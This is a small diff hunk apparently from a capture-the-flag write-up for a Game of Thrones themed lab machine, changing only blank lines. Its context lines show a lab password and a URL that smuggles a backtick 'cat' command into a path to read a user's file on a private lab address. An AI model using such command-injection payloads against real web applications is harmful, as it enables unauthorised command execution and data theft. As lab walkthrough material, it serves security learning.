@@ -589,8 +589,6 @@ Pass: LannisterN3verDie!
 ```
 
 
-
-
 ```
 http://192.168.229.135:1337/casterly-rock/blob/master/note_under_the_bed.md/%60cat%20/home/tyrionlannister/checkpoint.txt%60
 ```
